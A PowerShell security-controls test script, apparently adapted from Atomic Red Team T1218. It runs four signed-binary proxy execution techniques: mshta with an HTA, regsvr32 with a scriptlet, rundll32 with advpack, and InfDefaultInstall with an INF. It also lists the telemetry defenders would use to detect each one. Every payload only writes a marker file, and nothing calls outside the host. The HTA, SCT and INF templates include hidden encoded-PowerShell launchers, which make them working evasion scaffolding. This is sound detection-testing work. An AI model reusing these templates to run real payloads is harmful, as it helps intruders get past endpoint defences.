<#
.SYNOPSIS
    Technique 3.3: Living-off-the-Land Signed Binary Proxy Execution (T1218)

.DESCRIPTION
    Four subtests covering common Microsoft-signed binaries that proxy execution
    of script or installer content. These are adapted from Atomic Red Team T1218
    families, but kept fully offline and benign for submission: the script
    generates temporary payload files locally and each payload only writes a
    marker file to C:\Windows\Temp.

    Subtest 1 (MshtaHTA)         - mshta.exe executes a local HTA containing
                                    VBScript. Atomic family: T1218.005.

    Subtest 2 (Regsvr32SCT)      - regsvr32.exe loads a local COM scriptlet
                                    through scrobj.dll. Atomic family: T1218.010.

    Subtest 3 (Rundll32Advpack)  - rundll32.exe calls advpack.dll,
                                    LaunchINFSection against a local INF.
                                    Atomic family: T1218.011.

    Subtest 4 (InfDefaultInstall)- InfDefaultInstall.exe executes a local INF.
                                    Atomic family: T1218.

    Nothing malicious runs. All payloads are marker-file writes only.
    All temporary payload files are created under %TEMP% and can be cleaned up.

.PARAMETER Subtest
    Which subtest to run. Use 'All' to run all four sequentially.
    Default: MshtaHTA.

.EXAMPLE
    .\v3.3-lotl-signed-binary.ps1 -Subtest MshtaHTA
    .\v3.3-lotl-signed-binary.ps1 -Subtest All
#>

param(
    [ValidateSet('MshtaHTA','Regsvr32SCT','Rundll32Advpack','InfDefaultInstall','All')]
    [Alias('Technique')]
    [string]$Subtest = 'MshtaHTA',
    [switch]$NoCleanupPrompt,
    [switch]$NoPause,
    [switch]$NoReport,
    [switch]$CleanupOnly,
    [switch]$NonInteractive
)

$tempDir    = "C:\Windows\Temp"
$payloadDir = Join-Path $env:TEMP "sct-v3.3-lolbin"
$payloadOwnerPath = Join-Path $payloadDir '.sct-owner'
$payloadOwnerValue = 'SecurityControlsTesting-v3.3'

# ==============================================================================
# HELPERS
# ==============================================================================

function Write-Header {
    param([string]$Title, [string]$Detection)
    Write-Host ("`n" + ("="*90)) -ForegroundColor Magenta
    Write-Host "  SUBTEST: $Title" -ForegroundColor Magenta
    Write-Host "  DETECTION DIFFICULTY: $Detection" -ForegroundColor Magenta
    Write-Host ("="*90) -ForegroundColor Magenta
}

function Get-EncodedCommand {
    param([string]$Command)
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
}

function Confirm-SCTArtifactRemoval {
    param([Parameter(Mandatory)][string]$Description)

    if ($NonInteractive) {
        Write-Host "      Removing the stale SCT artifact automatically for this non-interactive run." -ForegroundColor DarkGray
        return $true
    }

    while ($true) {
        $answer = (Read-Host "      Remove existing SCT $Description and continue? [y/N]").Trim()
        if (-not $answer -or $answer -match '^(n|no)$') {
            return $false
        }
        if ($answer -match '^(y|yes)$') {
            return $true
        }
        Write-Host "      Enter Y or N." -ForegroundColor Yellow
    }
}

function Initialize-TestMarker {
    param([Parameter(Mandatory)][string]$Name)

    $marker = "$tempDir\art-v3.3-$Name.txt"
    if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) {
        return $marker
    }

    $content = [string](Get-Content -LiteralPath $marker -Raw -ErrorAction SilentlyContinue)
    if ($content -notmatch "(?i)$([regex]::Escape($Name)) signed-binary proxy execution") {
        Write-Host "  RESULT: Refusing to remove marker not identifiable as an SCT artifact: $marker" -ForegroundColor Yellow
        return $null
    }

    Write-Host "  [!] Existing SCT marker artifact detected: $marker" -ForegroundColor Yellow
    if (-not (Confirm-SCTArtifactRemoval -Description "marker file '$marker'")) {
        Write-Host "  RESULT: Existing SCT marker was kept." -ForegroundColor Yellow
        return $null
    }

    Remove-Item -LiteralPath $marker -Force -ErrorAction SilentlyContinue
    if (Test-Path -LiteralPath $marker) {
        Write-Host "  RESULT: Could not remove existing SCT marker: $marker" -ForegroundColor Yellow
        return $null
    }

    Write-Host "  [+] Removed existing SCT marker." -ForegroundColor Green
    return $marker
}

function New-PayloadDirectory {
    if (Test-Path -LiteralPath $payloadDir) {
        $owner = [string](Get-Content -LiteralPath $payloadOwnerPath -Raw -ErrorAction SilentlyContinue)
        if ($owner.Trim() -ne $payloadOwnerValue) {
            throw "Refusing to use existing directory not owned by SCT: $payloadDir"
        }
        return
    }

    New-Item -Path $payloadDir -ItemType Directory -ErrorAction Stop | Out-Null
    Set-Content -LiteralPath $payloadOwnerPath -Value $payloadOwnerValue -Encoding ASCII -ErrorAction Stop
}

function Test-ExecutionResult {
    param([string]$Name)
    Start-Sleep -Milliseconds 1500
    $marker = "$tempDir\art-v3.3-$Name.txt"
    if (Test-Path $marker) {
        Write-Host "[+] SUCCESS: Signed binary proxied payload execution - $marker" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[?] NOT OBSERVED: Marker file not found; review the control telemetry for the verdict." -ForegroundColor Yellow
        return $false
    }
}

function Invoke-Cleanup {
    param([string[]]$Names)
    foreach ($n in $Names) {
        Remove-Item "$tempDir\art-v3.3-$n.txt" -Force -ErrorAction Ignore
    }

    if (Test-Path -LiteralPath $payloadDir) {
        $owner = [string](Get-Content -LiteralPath $payloadOwnerPath -Raw -ErrorAction SilentlyContinue)
        if ($owner.Trim() -eq $payloadOwnerValue) {
            foreach ($payloadName in @(
                'sct-v3.3-mshta.hta',
                'sct-v3.3-regsvr32.sct',
                'sct-v3.3-rundll32.inf',
                'sct-v3.3-infdefaultinstall.inf'
            )) {
                Remove-Item -LiteralPath (Join-Path $payloadDir $payloadName) -Force -ErrorAction Ignore
            }
            Remove-Item -LiteralPath $payloadOwnerPath -Force -ErrorAction Ignore
            # Non-recursive removal preserves unexpected unrelated content.
            Remove-Item -LiteralPath $payloadDir -Force -ErrorAction Ignore
        } else {
            Write-Host "[!] Preserving payload directory not owned by SCT: $payloadDir" -ForegroundColor Yellow
        }
    }
    Write-Host "[+] Cleanup complete" -ForegroundColor Green
}

function New-MarkerCommand {
    param([string]$Name)
    $marker = "$tempDir\art-v3.3-$Name.txt"
    return "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] $Name signed-binary proxy execution')"
}

# ==============================================================================
# SUBTEST 1: mshta.exe local HTA execution
# Atomic Red Team: T1218.005 family
# ==============================================================================

function Test-MshtaHTA {
    Write-Header "mshta.exe Local HTA Execution (Atomic T1218.005 family)" "HIGH"
    Write-Host "`nBinary : C:\Windows\System32\mshta.exe"
    Write-Host "Method : Create a local .hta file containing VBScript and execute it through"
    Write-Host "         mshta.exe. The script runs outside the browser security context and"
    Write-Host "         writes a benign marker file."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - mshta.exe process creation with a user-writable .hta path"
    Write-Host "  Sysmon 11  - .hta file created in %TEMP%"
    Write-Host "  EDR alert  - mshta.exe executing script content or spawning script activity"
    Write-Host "  SIEM rule  - mshta.exe with command line containing .hta or http/https/script protocol"

    $marker = Initialize-TestMarker -Name 'MshtaHTA'
    if (-not $marker) {
        return $false
    }
    New-PayloadDirectory
    $htaPath = Join-Path $payloadDir "sct-v3.3-mshta.hta"

    $htaContent = @"
<html>
<head>
<HTA:APPLICATION ID="SCTMshtaHTA" APPLICATIONNAME="SCTMshtaHTA" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
<script language="VBScript">
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.CreateTextFile("$marker", True)
f.WriteLine "[" & Now() & "] MshtaHTA signed-binary proxy execution"
f.Close
self.close
</script>
</head>
<body></body>
</html>
"@

    Write-Host "`n[*] Writing local HTA payload..." -ForegroundColor Yellow
    Write-Host "    File: $htaPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $htaPath -Value $htaContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: HTA write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching mshta.exe with local HTA..." -ForegroundColor Yellow
    Write-Host "    Command: mshta.exe `"$htaPath`"" -ForegroundColor DarkGray
    try {
        Start-Process "C:\Windows\System32\mshta.exe" -ArgumentList "`"$htaPath`"" -Wait -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "MshtaHTA")
}

# ==============================================================================
# SUBTEST 2: regsvr32.exe local COM scriptlet execution
# Atomic Red Team: T1218.010 family
# ==============================================================================

function Test-Regsvr32SCT {
    Write-Header "regsvr32.exe Local COM Scriptlet Execution (Atomic T1218.010 family)" "HIGH"
    Write-Host "`nBinary : C:\Windows\System32\regsvr32.exe"
    Write-Host "Method : Create a local .sct COM scriptlet and ask regsvr32.exe to load it"
    Write-Host "         through scrobj.dll with /s /u /i. This does not register a COM object;"
    Write-Host "         it proxies script execution through a Microsoft-signed binary."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - regsvr32.exe with /i:<path or URL> and scrobj.dll"
    Write-Host "  Sysmon 7   - scrobj.dll loaded by regsvr32.exe"
    Write-Host "  Sysmon 11  - .sct file created in %TEMP%"
    Write-Host "  EDR alert  - Squiblydoo-style regsvr32 scriptlet execution"

    $marker = Initialize-TestMarker -Name 'Regsvr32SCT'
    if (-not $marker) {
        return $false
    }
    New-PayloadDirectory
    $sctPath = Join-Path $payloadDir "sct-v3.3-regsvr32.sct"

    $sctContent = @"
<?XML version="1.0"?>
<scriptlet>
  <registration progid="SCT.Regsvr32" classid="{11111111-1111-1111-1111-111111111111}">
    <script language="JScript">
      <![CDATA[
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var f = fso.CreateTextFile("$($marker.Replace('\','\\'))", true);
        f.WriteLine("[" + new Date().toString() + "] Regsvr32SCT signed-binary proxy execution");
        f.Close();
      ]]>
    </script>
  </registration>
</scriptlet>
"@

    Write-Host "`n[*] Writing local SCT payload..." -ForegroundColor Yellow
    Write-Host "    File: $sctPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $sctPath -Value $sctContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: SCT write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching regsvr32.exe with /s /u /i:<sct> scrobj.dll..." -ForegroundColor Yellow
    Write-Host "    Command: regsvr32.exe /s /u /i:`"$sctPath`" scrobj.dll" -ForegroundColor DarkGray
    try {
        $p = Start-Process "C:\Windows\System32\regsvr32.exe" -ArgumentList "/s /u /i:`"$sctPath`" scrobj.dll" -Wait -PassThru -ErrorAction Stop
        Write-Host "    regsvr32.exe exit code: $($p.ExitCode)" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "Regsvr32SCT")
}

# ==============================================================================
# SUBTEST 3: rundll32.exe advpack.dll INF execution
# Atomic Red Team: T1218.011 family
# ==============================================================================

function Test-Rundll32Advpack {
    Write-Header "rundll32.exe advpack.dll INF Execution (Atomic T1218.011 family)" "MEDIUM"
    Write-Host "`nBinary : C:\Windows\System32\rundll32.exe"
    Write-Host "Method : Create a local INF with a RunPreSetupCommands section and ask"
    Write-Host "         rundll32.exe to call advpack.dll,LaunchINFSection. The command"
    Write-Host "         only writes a marker file."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - rundll32.exe calling advpack.dll,LaunchINFSection"
    Write-Host "  Sysmon 11  - INF file created in %TEMP%"
    Write-Host "  EDR alert  - rundll32.exe launching setup/installer helper routines"
    Write-Host "  SIEM rule  - rundll32 command line contains LaunchINFSection"

    if (-not (Initialize-TestMarker -Name 'Rundll32Advpack')) {
        return $false
    }
    New-PayloadDirectory
    $infPath = Join-Path $payloadDir "sct-v3.3-rundll32.inf"
    $encoded = Get-EncodedCommand (New-MarkerCommand -Name "Rundll32Advpack")

    $infContent = @"
[version]
Signature=`$CHICAGO`$

[DefaultInstall_SingleUser]
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded

[Strings]
AppAct="SCT"
ServiceName="SCT"
ShortSvcName="SCT"
"@

    Write-Host "`n[*] Writing local INF payload..." -ForegroundColor Yellow
    Write-Host "    File: $infPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $infPath -Value $infContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: INF write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching rundll32.exe advpack.dll,LaunchINFSection..." -ForegroundColor Yellow
    Write-Host "    Command: rundll32.exe advpack.dll,LaunchINFSection `"$infPath`",DefaultInstall_SingleUser,1," -ForegroundColor DarkGray
    try {
        $args = "advpack.dll,LaunchINFSection `"$infPath`",DefaultInstall_SingleUser,1,"
        $p = Start-Process "C:\Windows\System32\rundll32.exe" -ArgumentList $args -Wait -PassThru -ErrorAction Stop
        Write-Host "    rundll32.exe exit code: $($p.ExitCode)" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "Rundll32Advpack")
}

# ==============================================================================
# SUBTEST 4: InfDefaultInstall.exe INF execution
# Atomic Red Team: T1218 family
# ==============================================================================

function Test-InfDefaultInstall {
    Write-Header "InfDefaultInstall.exe Local INF Execution (Atomic T1218 family)" "MEDIUM"
    Write-Host "`nBinary : C:\Windows\System32\InfDefaultInstall.exe"
    Write-Host "Method : Create a local INF with RunPreSetupCommands and execute it through"
    Write-Host "         InfDefaultInstall.exe. This covers a different signed installer"
    Write-Host "         binary than the rundll32/advpack path."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - InfDefaultInstall.exe with a user-writable INF path"
    Write-Host "  Sysmon 11  - INF file created in %TEMP%"
    Write-Host "  EDR alert  - installer binary executing script/interpreter child process"
    Write-Host "  SIEM rule  - InfDefaultInstall.exe launched outside normal driver/software install"

    if (-not (Initialize-TestMarker -Name 'InfDefaultInstall')) {
        return $false
    }
    New-PayloadDirectory
    $infPath = Join-Path $payloadDir "sct-v3.3-infdefaultinstall.inf"
    $encoded = Get-EncodedCommand (New-MarkerCommand -Name "InfDefaultInstall")

    $infContent = @"
[version]
Signature=`$CHICAGO`$

[DefaultInstall]
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded

[Strings]
AppAct="SCT"
ServiceName="SCT"
ShortSvcName="SCT"
"@

    Write-Host "`n[*] Writing local INF payload..." -ForegroundColor Yellow
    Write-Host "    File: $infPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $infPath -Value $infContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: INF write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching InfDefaultInstall.exe..." -ForegroundColor Yellow
    Write-Host "    Command: InfDefaultInstall.exe `"$infPath`"" -ForegroundColor DarkGray
    try {
        $p = Start-Process "C:\Windows\System32\InfDefaultInstall.exe" -ArgumentList "`"$infPath`"" -Wait -PassThru -ErrorAction Stop
        Write-Host "    InfDefaultInstall.exe exit code: $($p.ExitCode)" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "InfDefaultInstall")
}

# ==============================================================================
# RUN ALL
# ==============================================================================

function Test-All {
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|   SIGNED BINARY PROXY EXECUTION - ALL SUBTESTS                              |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan

    $tests = @(
        @{ Name = 'MshtaHTA';           Fn = ${function:Test-MshtaHTA}           },
        @{ Name = 'Regsvr32SCT';        Fn = ${function:Test-Regsvr32SCT}        },
        @{ Name = 'Rundll32Advpack';    Fn = ${function:Test-Rundll32Advpack}    },
        @{ Name = 'InfDefaultInstall';  Fn = ${function:Test-InfDefaultInstall}  }
    )

    $results = @()
    foreach ($t in $tests) {
        $results += @{ Name = $t.Name; Success = (& $t.Fn) }
        if (-not $NoPause) {
            Write-Host "`n[!] Check EDR/AV console before continuing." -ForegroundColor Yellow
            [void](Read-Host "    Press Enter for next subtest")
        }
    }
    return $results
}

# ==============================================================================
# REPORT
# ==============================================================================

function Write-Report {
    param([array]$Results)
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|                         EXECUTION REPORT                                    |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan
    foreach ($r in $Results) {
        $label = if ($r.Success) { "EXECUTED" } else { "NOT EXECUTED" }
        $color = if ($r.Success) { 'Green' } else { 'Yellow' }
        Write-Host "  [$label] $($r.Name)" -ForegroundColor $color
    }
    $ok    = ($Results | Where-Object { $_.Success }).Count
    $total = $Results.Count
    Write-Host "`n  $ok of $total signed-binary proxy subtests executed" -ForegroundColor Cyan
}

# ==============================================================================
# MAIN
# ==============================================================================

if ($CleanupOnly) {
    Invoke-Cleanup -Names @('MshtaHTA','Regsvr32SCT','Rundll32Advpack','InfDefaultInstall')
    exit 0
}

Write-Host "`n[TEST] Living-off-the-Land Signed Binary Proxy Execution (Technique 3.3)" -ForegroundColor Cyan
Write-Host "  MITRE: T1218  |  Phase 3  |  Privilege Escalation / Defense Evasion`n"

switch ($Subtest) {
    'All' {
        $results = Test-All
        if (-not $NoReport) {
            Write-Report -Results $results
        }
        Write-Host "`n[*] Marker files in $tempDir (art-v3.3-*.txt) left for review." -ForegroundColor Yellow
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') {
                Invoke-Cleanup -Names @('MshtaHTA','Regsvr32SCT','Rundll32Advpack','InfDefaultInstall')
            }
        }
    }
    default {
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        Write-Host "|   SINGLE SUBTEST: $Subtest" -ForegroundColor Cyan
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        if (-not $NoPause) {
            Write-Host "`n[!] Have EDR/AV console visible before proceeding." -ForegroundColor Yellow
            [void](Read-Host "    Press Enter to start")
        }

        $success = switch ($Subtest) {
            'MshtaHTA'          { Test-MshtaHTA          }
            'Regsvr32SCT'       { Test-Regsvr32SCT       }
            'Rundll32Advpack'   { Test-Rundll32Advpack   }
            'InfDefaultInstall' { Test-InfDefaultInstall }
        }

        $color = if ($success) { 'Green' } else { 'Yellow' }
        Write-Host "`n[RESULT] Subtest '$Subtest': $(if ($success) { 'EXECUTED' } else { 'NOT EXECUTED' })" -ForegroundColor $color
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') { Invoke-Cleanup -Names @($Subtest) }
        }
    }
}
